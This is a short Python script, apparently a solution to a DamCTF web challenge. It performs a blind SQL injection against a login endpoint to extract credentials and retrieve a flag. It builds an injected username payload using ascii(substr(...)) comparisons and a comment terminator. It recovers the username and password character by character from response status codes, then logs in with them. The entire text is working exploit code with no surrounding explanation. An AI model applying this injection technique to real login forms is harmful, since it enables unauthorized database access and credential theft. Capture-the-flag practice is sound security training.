import requests, string

s = requests.session()

url = 'https://bouncy-box.chals.damctf.xyz/login'

arr = string.printable

def blind_row(column,step):
    for c in arr:
        res = s.post(url,json={"username":f"hacker' or ascii(substr((select {column} from users limit 1),{step},1))={ord(c)}-- -",
        "password":"hacked","score":1337}).status_code
        if res==200:
            return c
    return None
 
def rows(column):
    row = ''
    step = len(row) +1
    while True:
        c = blind_row(column,step)
        if c == None:
            return row
        row += c
        step += 1
        print('[+] %s = '%column,row)  

username = rows('username')
password = rows('password')

flag = s.post('https://bouncy-box.chals.damctf.xyz/flag',data={'username_input':username,'password_input':password}).text
print(flag)
